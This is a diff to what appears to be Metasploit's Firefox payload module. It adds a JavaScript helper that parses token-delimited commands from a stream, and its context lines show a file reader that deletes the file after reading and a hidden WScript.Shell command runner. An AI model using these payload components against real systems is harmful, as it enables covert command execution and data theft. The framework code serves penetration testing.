@@ -16,6 +16,37 @@ module Msf::Payload::Firefox
     |
   end
 
+  # Javascript source of readUntilToken(s)
+  # Continues reading the stream as data is available, until a pair of
+  #   command tokens like [[aBcD123ffh]] [[aBcD123ffh]] is consumed.
+  #
+  # Returns a function that can be passed to the #onDataAvailable callback of
+  #   nsIInputStreamPump that will buffer until a second token is read, or, in
+  #   the absence of any tokens, a newline character is read.
+  #
+  # @return [String] javascript source code that exposes the readUntilToken(cb) function
+  def read_until_token_source
+    %Q|
+      var readUntilToken = function(cb) {
+        Components.utils.import("resource://gre/modules/NetUtil.jsm");
+
+        var buffer = '', m = null;
+        return function(request, context, stream, offset, count) {
+          buffer += NetUtil.readInputStreamToString(stream, count);
+          if (buffer.match(/^(\\[\\[\\w{8}\\]\\])/)) {
+            if (m = buffer.match(/^(\\[\\[\\w{8}\\]\\])([\\s\\S]*)\\1/)) {
+              cb(m[2]);
+              buffer = '';
+            }
+          } else if (buffer.indexOf("\\n") > -1) {
+            cb(buffer);
+            buffer = '';
+          }
+        };
+      };
+    |
+  end
+
   # Javascript source code of readFile(path) - synchronously reads a file and returns
   # its contents. The file is deleted immediately afterwards.
   #
@@ -189,4 +220,5 @@ module Msf::Payload::Firefox
       (new ActiveXObject("WScript.Shell")).Run(cmd, 0, true);
     |
   end
+
 end
